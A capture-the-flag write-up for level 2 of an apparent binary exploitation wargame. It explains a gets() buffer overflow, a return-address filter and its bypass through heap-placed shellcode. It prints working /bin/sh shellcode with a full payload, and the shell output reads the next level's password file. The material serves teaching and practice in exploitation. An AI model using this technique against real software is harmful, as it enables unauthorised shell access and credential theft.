## Level 2

### Vulnerability Analysis
The target is `level2`. Like level 1, running it waits for standard input. 
Analysing the `main` function using `gdb` shows that it simply sets up the stack frame and immediately calls another function named `p()`.

```assembly
0x08048545 <+6>:     call   0x80484d4 <p>
```

When we disassemble `p()`, we spot a clear vulnerability, but also a custom security mechanism:
1. `gets()` is called on a buffer located at `ebp-0x4c` (76 bytes below the base pointer). This means we can overflow it to overwrite EBP (at +76) and EIP (at +80). 
2. However, right after the `gets()` call, the program reads the saved return address (EIP) that we just overwrote, and performs a bitwise operation on it: `and eax, 0xb0000000; cmp eax, 0xb0000000`.
3. If our return address begins with `0xb` (e.g., `0xbfffffff`), the program prints our address and exits!

Because stack memory addresses usually start with `0xbf` and standard libraries (libc) start with `0xb7`, this bitmask filter safely blocks both standard Stack Execution and Return-to-libc (Ret2libc) attacks!

However, scanning to the end of `p()`, we see this:
```assembly
0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```
`strdup()` creates a duplicate of our input buffer and allocates it on the **Heap**. The Heap typically resides at an address starting with `0x08...`, which easily bypasses the `0xb...` filter. Since NX is disabled, memory is executable. 

### The Exploit
By examining `p()`, we know the target buffer is 76 bytes long. The saved EIP is located 80 bytes from the start of the buffer.

Because our input is duplicated onto the Heap via `strdup()`, we can supply valid 32-bit shellcode, let it be copied to the Heap, and overwrite the EIP with the address of that Heap allocation to execute the shellcode.

Using `ltrace ./level2 < <(python -c 'print "A" * 80 + "B" * 4')`, we observed the behavior of `strdup`:
```
strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 0x0804a008
```
This confirms our input gets copied exactly to the memory address `0x0804a008`. Written in reverse (Little Endian) for our exploit, it is `\x08\xa0\x04\x08`.

We will construct a payload using standard 21-byte `/bin/sh` shellcode. Since our offset is 80 bytes, we will pad the payload with `\x90` (NOP instructions) to fill the remainder of the buffer safely:
Payload: `[Shellcode] + [NOP padding] + [Heap Address]`

```bash
level2@RainFall:~$ (python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2
1Qh//shh/bin
                 ̀
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
